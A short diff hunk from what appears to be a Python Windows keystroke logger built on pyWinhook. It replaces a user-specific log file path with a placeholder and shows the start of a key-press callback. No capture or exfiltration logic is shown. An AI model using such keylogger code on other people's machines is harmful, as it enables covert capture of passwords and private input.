@@ -3,7 +3,7 @@
 import pyWinhook
 import pythoncom
 #change this to your log file's path
-log_file=r'C:\Users\Catherine\Desktop\File.log'
+log_file=r'path to writeable file'
 
 #this function is called everytime a key is pressed.
 def OnKeyPress(event):
